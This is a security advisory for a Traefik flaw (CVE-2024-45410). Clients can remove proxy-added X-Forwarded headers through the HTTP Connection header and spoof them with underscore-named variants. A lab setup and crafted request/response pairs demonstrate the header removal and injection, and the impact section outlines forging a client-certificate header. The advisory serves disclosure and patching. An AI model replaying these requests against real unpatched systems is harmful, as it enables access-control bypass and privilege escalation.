# HTTP client can manipulate custom HTTP headers that are added by Traefik

**GHSA**: GHSA-62c8-mh53-4cqv | **CVE**: CVE-2024-45410 | **Severity**: critical (CVSS 7.5)

**CWE**: CWE-345, CWE-348

**Affected Packages**:
- **github.com/traefik/traefik/v3** (go): >= 3.0.0-beta3, < 3.1.3
- **github.com/traefik/traefik/v2** (go): < 2.11.9
- **github.com/traefik/traefik** (go): < 2.11.9

## Description

### Impact

There is a vulnerability in Traefik that allows the client to remove the X-Forwarded headers (except the header X-Forwarded-For).

### Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.9
- https://github.com/traefik/traefik/releases/tag/v3.1.3

### Workarounds

No workaround.

### For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>
### Summary

When a HTTP request is processed by Traefik, certain HTTP headers such as X-Forwarded-Host or X-Forwarded-Port are added by Traefik before the request is routed to the application. For a HTTP client, it should not be possible to remove or modify these headers. Since the application trusts the value of these headers, security implications might arise, if they can be modified.

For HTTP/1.1, however, it was found that some of theses custom headers can indeed be removed and in certain cases manipulated. The attack relies on the HTTP/1.1 behavior, that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:

Connection: close, X-Forwarded-Host

Depending on how the receiving application handles such cases, security implications may arise. Moreover, some application frameworks (e.g. Django) first transform the "-" to "_" signs, making it possible for the HTTP client to even modify these headers in these cases.

This is similar to [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813) for Apache HTTP Server.

### Details

It was found that the following headers can be removed in this way (i.e. by specifing them within a connection header):

- X-Forwarded-Host
- X-Forwarded-Port
- X-Forwarded-Proto
- X-Forwarded-Server
- X-Real-Ip
- X-Forwarded-Tls-Client-Cert
- X-Forwarded-Tls-Client-Cert-Info

### PoC

The following docker-compose file has been used for a simple setup:

```
services:
  traefik:
    image: traefik:v3.1
    container_name: traefik
    ports:
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./traefik.yaml:/etc/traefik/traefik.yaml
      - ./traefik-certs:/certs

  python-http:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: python-http
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.python-http.rule=Host(`python.example.com`)"
      - "traefik.http.routers.python-http.entrypoints=websecure"
      - "traefik.http.routers.python-http.tls=true"
      - "traefik.http.services.python-http.loadbalancer.server.port=8080"
```

The following traefik.yaml has been used:

```
providers:
  docker:
    exposedByDefault: false
    watch: true
  file:
    fileName: /etc/traefik/traefik.yaml
    watch: true

entryPoints:
  websecure:
    address: ":443"

tls:
  certificates:
    - certFile: /certs/server-cert.pem
      keyFile: /certs/server-key.pem
```

The Python container just includes a simple Python HTTP server that prints the HTTP headers it receives. Here is the Dockerfile for the container:

```
FROM python:3-alpine

# Copy the Python script to the container
COPY server.py /server.py

# Set the working directory
WORKDIR /

# Command to run the Python server
CMD ["python", "/server.py"]
```

And here is the Python script:

```
from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def _send_response(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(str(self.headers).encode("utf-8"))

    def do_GET(self):
        self._send_response()

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("Server started on port 8080")
    server.serve_forever()
````

The environment is run with `sudo docker-compose up`.

A normal HTTP request/response pair looks like this:

**Request 1**

````
GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
````

**Response 1**

````
HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:53:49 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 556

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Host: python.example.com
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
````

The custom headers added by Traefik can be seen in the response.

Next, a request, where the X-Forwarded-Host header is defined as a hop-by-hop header via the Connection header is sent:

**Request 2**

````
GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close, X-Forwarded-Host
````

**Response 2**

````
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
````

As can be seen from the response, the X-Forwarded-Host header that had been added by Traefik has been removed from the request.

Moreover, the next request/response pair demonstrates that a custom header with underscore instead of hyphen can be added:

**Request 3**

````
GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X_Forwarded_Host: myhost
Connection: close, X-Forwarded-Host
````

**Response 3**

````
HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:54:48 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 544

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
X_forwarded_host: myhost
````

Some backend frameworks (e.g. Django) handle X-Forwarded-Host and X_forwarded_host in the same way. As there is no X-Forwarded-Host header present in the request, the X_forwarded_host header will be used. 

It should be noted that when X-Forwarded-Host is present and a X_forwarded_host header is sent, usually the first occurence of the header will be used, which is in this case X-Forwarded-Host.

It should be noted that the headers X-Forwarded-Tls-Client-Cert and X-Forwarded-Tls-Client-Cert-Info are also affected. Here, client certificate authentication would need to be enabled in the Traefik setup.

### Impact

All applications that trust the custom headers set by Traefik are affected by this vulnerability. As an example, assume that a backend application trusts Traefik to validate client certificates and trusts therefore the values that are sent within the X-Forwarded-Tls-Client-Cert header, but does not validate the certificate anew.

If the header is removed via the vulnerability, and the application framework allows for alternative names (e.g. by transforming the headers to lower case, and "-" to "_"), an attacker can place his own X_Forwarded_TLS_Client_Cert header in the request. This could lead to privilege escalation, as the attacker may put an (invalid) certificate in this header that would just be accepted by the application, but may contain other data than the certificate that is presented to Traefik for Client Certificate Authentication.

Moreover, if the backend application uses any of the other custom headers for security-sensitive operations, the removal or modification of these headers may also security implications (e.g. access control bypass).

The severity is the same as for [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813) for Apache HTTP Server, i.e. 9.8 Critical.
</details>
